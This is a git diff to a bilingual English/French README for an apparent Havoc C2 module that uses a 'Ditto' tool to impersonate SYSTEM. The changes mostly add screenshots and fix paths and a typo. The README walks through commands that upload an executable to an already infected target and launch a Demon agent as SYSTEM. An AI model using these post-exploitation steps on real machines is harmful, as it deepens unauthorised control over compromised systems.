@@ -42,7 +42,12 @@ After cloning, open your Havoc client.
 
 3. Click on the "Script" tab and open the script manager window.
 
+![alt text](img/image1.png)
+
 4. Click "Load Script", choose the impersonnate.py file, and open it.
+
+![alt text](img/image2.png)
+![alt text](img/image3.png)
 
 A line will appear in the script manager tab, indicating that the script has been loaded into Havoc.
 
@@ -51,14 +56,17 @@ A line will appear in the script manager tab, indicating that the script has bee
 
 You must have infected your target and have a privileged account before using this module.
 
+![alt text](img/image.png)
+
 #### Upload
 ##### Step 1
 
 This command is used to set the local file to be uploaded to your target. The uploaded file take your id session havoc to name it.
 
 ```
-Ditto-upload SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
+Ditto-upload SetExecutableFile ~/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
 ```
+![alt text](img/image4.png)
 
 ##### Step 2
 
@@ -67,14 +75,16 @@ Ditto-upload SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc
 ```
 Ditto-upload DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
 ```
+![alt text](img/image5.png)
 
 **To execute a custom command for Ditto or other executble:**
 !!! Warning !!!
-the option -h or --help was interprete by havoc and craching my module
+the option -h or --help was interpreted by havoc and craching my module
 
 ```
 Ditto-upload Exec help
 ```
+![alt text](image.png)
 
 #### In Memory
 ##### Step 1
@@ -90,6 +100,7 @@ Ditto-Memory SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc
 ```
 Ditto-Memory DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
 ```
+
 
 **To execute a custom command for Ditto:**
 !!! Warning !!!
@@ -137,7 +148,12 @@ Après le clonage, ouvrez votre client Havoc.
 
 3. Cliquez sur l'onglet "Script" et ouvrez la fenêtre du gestionnaire de scripts.
 
+![alt text](img/image1.png)
+
 4. Cliquez sur "Load Script", choisissez le fichier impersonnate.py et ouvrez-le.
+
+![alt text](img/image2.png)
+![alt text](img/image3.png)
 
 Une ligne apparaîtra dans l'onglet du gestionnaire de scripts, indiquant que le script a été chargé dans Havoc.
 
@@ -146,14 +162,17 @@ Une ligne apparaîtra dans l'onglet du gestionnaire de scripts, indiquant que le
 
 Vous devez avoir infecté votre cible et disposer d'un compte privilégié avant d'utiliser ce module.
 
+![alt text](img/image.png)
+
 #### Upload
 ##### Étape 1
 
 Cette commande est utilisée pour définir le fichier local à télécharger sur votre cible. Le fichier uploader prendra le nom de votre session Havoc.
 
 ```
-Ditto-upload SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
+Ditto-upload SetExecutableFile ~/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
 ```
+![alt text](img/image4.png)
 
 ##### Étape 2
 
@@ -161,11 +180,13 @@ Ditto-upload SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc
 ```
 Ditto-upload DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
 ```
+![alt text](image.png)
 
 **Pour exécuter une commande personnalisée pour Ditto :**
 ```
 Ditto-upload Exec help
 ```
+![alt text](image.png)
 
 #### En mémoire
 ##### Étape 1
@@ -182,6 +203,7 @@ Pour obtenir un shell système :
 ```
 Ditto-Memory DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
 ```
+
 
 Pour exécuter une commande personnalisée pour Ditto :
 ```
